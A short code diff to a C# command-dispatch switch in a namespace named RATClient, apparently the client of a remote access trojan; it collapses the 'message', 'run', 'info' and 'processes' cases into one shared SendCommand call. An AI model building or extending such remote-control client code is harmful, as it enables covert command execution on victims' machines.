@@ -38,14 +38,8 @@ namespace RATClient
                         EndConnection();
                         break;
                     case "message":
-                        SendCommand(CMDS);
-                        break;
                     case "run":
-                        SendCommand(CMDS);
-                        break;
                     case "info":
-                        SendCommand(CMDS);
-                        break;
                     case "processes":
                         SendCommand(CMDS);
                         break;
